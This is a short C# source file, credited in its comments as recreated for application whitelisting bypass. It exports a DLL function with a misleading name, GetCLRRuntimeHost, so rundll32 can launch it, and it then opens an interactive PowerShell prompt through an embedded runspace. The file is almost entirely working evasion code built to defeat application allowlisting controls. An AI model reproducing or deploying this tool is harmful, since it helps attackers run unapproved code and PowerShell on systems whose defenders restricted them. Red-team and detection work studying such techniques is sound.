using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Runtime.InteropServices;
using System.Management.Automation;
using RGiesecke.DllExport;
using System.Collections.ObjectModel;
//recreated by Evan Pena for app whitelisting bypass

//code originally found in video here: https://www.youtube.com/watch?v=75XImxOOInU

namespace CoreGenPowerShell
{
    public class GetPS
    {
        //rundll32 entry point
        [DllExport("GetCLRRuntimeHost", CallingConvention = CallingConvention.StdCall)]
        public static bool GetCLRuntimeHost()
        {
            while (true)
            {
                Console.Write("PS >");
                string x = Console.ReadLine();
                try
                {
                    Console.WriteLine(RunPSCommand(x));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            
            return true;
        }
        
        public static string RunPSCommand(string cmd)
        {
            System.Management.Automation.Runspaces.Runspace runspace = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            System.Management.Automation.Runspaces.Pipeline pipeline = runspace.CreatePipeline();

            //add commands
            pipeline.Commands.AddScript(cmd);
            
            //Prep PS for String output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        public static void RunPSFile(string script)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript(script).Invoke();
        }
    }
}
